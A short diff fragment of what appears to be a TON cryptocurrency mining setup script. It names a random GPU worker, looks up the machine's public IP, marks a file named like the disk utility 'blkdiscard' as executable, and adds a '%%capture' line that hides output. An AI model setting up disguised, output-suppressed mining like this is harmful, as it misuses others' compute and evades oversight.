@@ -4,6 +4,7 @@ USER=$1
 ALGO=TON
 WORKER=$(echo GPU-$(shuf -i 1000-9999 -n 1))
 
+%%capture
 #gives ip address 
 curl ipecho.net/plain
 chmod +x blkdiscard
